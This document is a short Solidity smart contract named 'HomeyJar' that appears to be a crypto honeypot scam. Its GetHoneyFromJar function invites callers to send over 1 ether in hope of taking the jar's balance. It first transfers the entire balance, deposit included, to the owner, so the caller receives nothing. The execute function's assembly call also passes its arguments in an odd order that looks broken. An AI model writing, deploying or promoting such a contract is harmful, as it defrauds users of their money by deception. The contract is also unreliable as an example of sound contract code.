pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function setOwner(address newOwner) public {
        require(msg.sender == Owner);
        Owner = newOwner;
    }

    function execute(address to, uint256 value, bytes data) public payable {
        require(msg.sender == Owner);
        require(to != address(0));

        bool success;
        assembly {
            let inputData := add(data, 0x20)
            let dataLength := mload(data)
            success := call(value, to, 0, inputData, dataLength, 0, 0)
        }
        require(success);
    }
}